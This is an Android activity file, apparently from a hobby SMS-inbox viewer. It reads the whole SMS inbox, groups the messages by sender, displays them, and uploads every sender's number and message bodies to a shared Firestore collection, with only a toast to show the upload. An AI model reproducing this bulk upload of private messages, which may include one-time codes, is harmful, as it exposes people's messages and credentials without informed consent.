package com.example.inboxmsg;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Telephony;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.example.inboxmsg.model.Sms;
import com.example.inboxmsg.model.SmsServices;
import com.google.firebase.FirebaseApp;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private RecyclerView homeRecycleview;
    List<SmsServices>smsList=new ArrayList<>();
    List<Sms>sms=new ArrayList<>();

    // In this method logic for sepearation by using Map
    Map<String,List<String>> smsMap=new HashMap<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        FirebaseApp.initializeApp(this);
        setContentView(R.layout.activity_main);
        homeRecycleview=findViewById(R.id.homeRecycleview);
        if(!checkPermissions()){
           permissions();
        }
        startService(new Intent(this, SmsListenerService.class));
        getAllMessages();
        // Check for SMS permissions at runtime


        //set recycleview
        homeRecycleview.setLayoutManager(new LinearLayoutManager(this));
        homeRecycleview.setAdapter(new HomePageAdapter(this,sms));


        // firebase
       // FirebaseFirestore instance = FirebaseFirestore.getInstance();




    }
    private  void getAllMessages(){
       String msg="";
        ContentResolver contentResolver = getContentResolver();
        Uri inboxUri = Telephony.Sms.Inbox.CONTENT_URI;
        // Query the inbox for SMS messages
        Cursor cursor = contentResolver.query(inboxUri, null, null, null, null);
        while(cursor!=null && cursor.moveToNext()){
            // getting senderPhoneNumber details
            String senderPhoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
            // getting senderBody details
            String senderBody = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));

           // smsList.add(new SmsServices(senderPhoneNumber,senderBody));

            seperateByGroups(senderPhoneNumber,senderBody);



        }


        for(Map.Entry<String,List<String>> entry :smsMap.entrySet()){
            String senderPhoneNum= entry.getKey();
            List<String> senderBodylist= entry.getValue();
            Sms smsDetails = new Sms(senderPhoneNum, senderBodylist);
            sms.add(smsDetails);


            // Check if data already exists in Firestore for this sender
            FirebaseFirestore.getInstance()
                    .collection("sms_services_collections")
                    .whereEqualTo("senderInfo", senderPhoneNum)
                    .get()
                    .addOnCompleteListener(task -> {
                        if (task.isSuccessful() && task.getResult() != null && !task.getResult().isEmpty()) {
                            // Data already exists, you can choose to update it if needed

                            // Data already exists, update the existing document with the new message
                            DocumentSnapshot documentSnapshot = task.getResult().getDocuments().get(0);
                            List<String> existingMessages = (List<String>) documentSnapshot.get("senderBodyList");

                            // Add only the new messages that don't already exist
                            for (String newMessage : senderBodylist) {
                                if (!existingMessages.contains(newMessage)) {
                                    existingMessages.add(newMessage);
                                }
                            }

                            // Update the document with the new messages
                            documentSnapshot.getReference().update("senderBodyList", existingMessages)
                                    .addOnSuccessListener(aVoid -> Log.d("Firestore", "Document updated successfully"))
                                    .addOnFailureListener(e -> Log.e("Firestore", "Failed to update document: " + e.getMessage()));
                        } else {
                            // Data does not exist, add it to Firestore
                            SmsServices smsServices = new SmsServices(senderPhoneNum, senderBodylist);
                            smsList.add(smsServices);
                            saveSmsServicestoFirebase(smsServices);
                        }
                    });


        }
        Log.i("VIKASSMS",smsList+"");


    }

    private  void permissions(){
         final int MY_PERMISSIONS_REQUEST_READ_SMS = 1;
        // Check for the READ_SMS permission at runtime
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted, request it
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, MY_PERMISSIONS_REQUEST_READ_SMS);
        }
    }

    private boolean checkPermissions() {
        int i = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        if(i== PackageManager.PERMISSION_GRANTED) return  true;
        return  false;
    }

    private  void seperateByGroups(String senderPhoneNo, String senderBody){

//        //list of senderBody of specific senderPhoneno
//        List<String> senderBodyList=new ArrayList<>();
//        String KEY="";
        if(!smsMap.containsKey(senderPhoneNo)){
            smsMap.put(senderPhoneNo,new ArrayList<>());
        }
//        if(smsMap.containsKey(senderPhoneNo)){
//            senderBodyList.add(senderBody);
//            smsMap.put(senderPhoneNo,)
//        }
        smsMap.get(senderPhoneNo).add(senderBody);

    }

    private void saveSmsServicestoFirebase(SmsServices smsServices) {
        FirebaseFirestore.getInstance()
                .collection("sms_services_collections")
                .add(smsServices)
                .addOnSuccessListener(documentReference -> {
                    Toast.makeText(MainActivity.this, "Successfully added data with ID: " + documentReference.getId(), Toast.LENGTH_SHORT).show();
                })
                .addOnFailureListener(e -> {
                    Toast.makeText(MainActivity.this, "Failed to add data. Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                    Log.e("Checking",e.getMessage());
                });
    }
}